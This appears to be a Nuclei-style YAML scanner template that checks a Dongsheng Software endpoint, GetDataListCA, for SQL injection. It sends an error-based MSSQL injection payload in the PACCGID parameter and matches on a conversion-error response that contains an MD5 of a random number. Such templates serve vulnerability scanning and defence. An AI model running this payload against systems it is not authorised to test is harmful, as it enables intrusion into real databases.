id: poc-yaml-dongshengsoft-getdatalistca-sqli
info:
  name: Dongsheng Software GetDataListCA SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(1000,10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/MvcShipping/MsCwGenlegAccitems/GetDataListCA?PACCGID=1')%20AND%206782%20IN%20(SELECT%20(sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))))--+OevW"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "在将 nvarchar 值"
          - "转换成数据类型 int 时失败"
          - "{{t2}}"
